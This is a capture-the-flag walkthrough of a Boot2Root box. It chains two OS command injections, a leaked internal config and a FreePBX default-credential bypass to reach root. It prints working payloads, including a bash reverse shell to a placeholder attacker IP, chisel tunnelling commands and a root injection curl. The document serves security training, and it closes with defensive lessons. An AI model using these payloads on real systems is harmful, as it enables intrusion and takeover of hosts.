# Day - 11

---

**Challenge name:** Infinity Pool

**Category:** Boot2Root

**Difficulty:** Medium

**Date completed:** 7th of August 2026

---

## Summary

Byte Lotus's "sister-property connectivity" staff tool takes a hostname and shells out to `ping` with zero sanitization - classic OS command injection dressed up as an SSRF-looking feature. That got an initial shell as `web`, which turned into a tour of three internal Flask/Gunicorn services running behind loopback-only binds: the public-facing `edge` app (us), a `watchtower` ops console, and an `automation` job runner running as root. `watchtower`'s `/api/config` endpoint leaked FreePBX UCP credentials and pointed straight at the automation service's `/jobs/export` endpoint, which needed a bearer token. The UCP login (fitting a real disclosed FreePBX auth-bypass, CVE-2026-46376, complete with the tell-tale hard-coded template account name) only completes through a real browser since the login flow is JS/AJAX-driven, so the loopback-only ports had to be tunnelled out to attack-box for browser access. Inside UCP, the automation bearer key was hidden as a voicemail message. That key unlocked `/jobs/export`, which builds a shell command from a `report` filename with no sanitization - a second command injection, this time running as root.

---

### Step 1: Recon

```bash
nmap -sCV 10.49.171.192
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Gunicorn
| http-robots.txt: 2 disallowed entries
|_/internal/ /status
|_http-title: Byte Lotus — Stay Noticed
```

`robots.txt` pointed straight at `/internal/` and `/status`.

---

### Step 2: Finding the injection point

`/status` (served from `/internal/netcheck` on submit) is a "confirm a remote property responds" tool - a text box for a host, a Check button. Submitting `127.0.0.1` returned real `ping` output verbatim, including timing stats. Submitting `127.0.0.1/internal` returned `ping: 127.0.0.1/internal: Name or service not known` - the *entire* input was being handed to `ping` as a single argument, which meant the backend wasn't validating or parsing the host at all. That's not SSRF, it's command injection with extra steps.

---

### Step 3: Confirming and weaponizing

```
127.0.0.1; id
```

The page returned the normal ping output plus `uid=1001(web) gid=1001(web)` confirming RCE. From there, a bash reverse shell payload in the same field:

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

landed a shell as `web`, working directory `/var/www/infinity_pool/edge`. 

Stabilizing the shell:

 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

The user flag was found in the home directory. 

```bash
cat /home/web/user.txt
THM{REDACTED}
```

Reading the app source “app.py” : `subprocess.run(f"ping -c 1 {host}", shell=True, ...)` - raw f-string interpolation into a shelled-out command, no escaping whatsoever.

---

### Step 4: Mapping the internal services

`ss -tlnp` showed a cluster of loopback-only ports: 3000, 8080, 8088/8089 (Asterisk HTTP), 5038 (Asterisk Manager Interface), 9000, and 3306 (MariaDB). Cross-referencing with readable systemd units (`/etc/systemd/system/cc-*.service`) mapped it out cleanly:

- `cc-edge.service` — the app we already own, runs as `web`, binds `0.0.0.0:80`
- `cc-watchtower.service` — an ops console, runs as `svc-watch`, binds `127.0.0.1:3000`
- `cc-automation.service` — a job runner, runs as **root**, binds `127.0.0.1:9000`, loads `automation.env` (root-only, unreadable)

`find -perm -4000` and `getcap -r /` turned up nothing exploitable (just standard `ping`/snap capabilities) - no SUID/capability privesc path, so the internal services were the way in.

---

### Step 5: The config leak

`watchtower`'s homepage advertised its own API surface. `curl 127.0.0.1:3000/api/config` handed over:

- FreePBX UCP credentials (a hard-coded "template creator" account + password, explicitly flagged in the response as "still on default template creds — ROTATE")
- The UCP portal location (`127.0.0.1:8080/ucp`)
- The `automation` service's address (`127.0.0.1:9000`)

Hitting `automation`'s `/health` endpoint self-documented its own API: `POST /jobs/export`, guarded by `Authorization: Bearer <automation key>`, body `{"report": "<name>"}`, and critically: `"runs_as":"root"`.

---

### Step 6: Identifying the UCP vulnerability

The UCP login page's footer confirmed FreePBX 16.0.45. The leaked username - a literal FreePBX internal template-account name - is the signature tell for a real disclosed FreePBX authentication bypass (CVE-2026-46376): hard-coded credentials baked into the UCP generic template that let you log straight into the User Control Panel using that template account and its (here, un-rotated) password.

---

### Step 7: Tunnelling out for a real browser session

The UCP login form posts through JavaScript/AJAX rather than a plain form submit, so scripted `curl` logins (even with correct credentials, tokens, and referer headers) just bounced back to the login page - the client-side JS is what actually drives the authenticated session. Since these ports are loopback-only on the target, they needed to be tunnelled out to a real browser on the attack box. `chisel` wasn't present on the target, so a matching `linux_amd64` static binary was pulled onto the box via the existing reverse shell (served from a local Python HTTP server), and a reverse tunnel was established:

```bash
# attack box
./chisel server -p 9001 --reverse

# target (reverse shell)
./chisel client <ATTACKER_IP>:9001 R:8080:127.0.0.1:8080 R:3000:127.0.0.1:3000 R:9000:127.0.0.1:9000
```

With the tunnel up, `http://127.0.0.1:8080/ucp/` was reachable from an actual browser on the attack box, and the leaked credentials logged in cleanly this time.

---

### Step 8: The bearer key, hidden in a voicemail

Inside UCP, adding the **Voicemail** widget to the dashboard surfaced a single inbox message. Its Caller ID (CID) field contained the automation bearer key outright - a nice touch for a telephony-themed box, hiding a secret inside the one place a phone-system UI would naturally stash something.

---

### Step 9: Second injection, this time as root

Authenticating to `/jobs/export` with the recovered key returned:

```json
{"command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1", ...}
```

confirming the `report` field is concatenated directly into a shell command, unsanitized, exactly like the very first `ping` injection. Same bug class, different service, running as root this time:

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer <AUTOMATION_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
```

```
THM{REDACTED}
```

---

## Rabbit Hole

Before realizing the UCP login was JS/AJAX-driven, significant time was spent trying to authenticate with `curl`: testing different endpoints, CSRF tokens, headers, JSON bodies, and brute-forcing likely usernames. None of it worked because the session was established client-side in JavaScript, something `curl` couldn't replicate. Early on, the success check also relied on a static `error-msg` element, producing false positives and further delaying the discovery of the real issue.

Additional host enumeration—SUID binaries, capabilities, cron jobs, AMI on port 5038, anonymous MySQL access, and protected FreePBX/MySQL configuration files which ultimately became irrelevant once the leaked `watchtower` configuration exposed the correct UCP and automation endpoints.

A minor setback also came from downloading the wrong Chisel binary (`arm64` instead of `linux_amd64`), resulting in an `exec format error` until the system architecture was verified with `uname -a`.

---

## Why this worked

The compromise relied on two separate command injection flaws: unsanitized user input was passed directly into shell commands (`ping -c 1 {host}` and `tar czf .../{report}`), allowing arbitrary command execution. A leaked internal configuration then exposed privileged endpoints, while a known FreePBX authentication bypass using unchanged default template credentials enabled privilege escalation. Individually, these were moderate issues, but together they formed a complete path to root.

---

## Lessons Learned

- Never pass user input directly into shell commands; use argument arrays or strict input validation.
- "Internal-only" services are not secure once an attacker gains code execution on the host.
- Default or leaked credentials must be rotated immediately and warnings alone provide no protection.
- Verify whether authentication is form-based or JS/AJAX-driven before automating login attempts.
- Build a reliable success/failure check before brute-forcing to avoid wasting time on false positives.
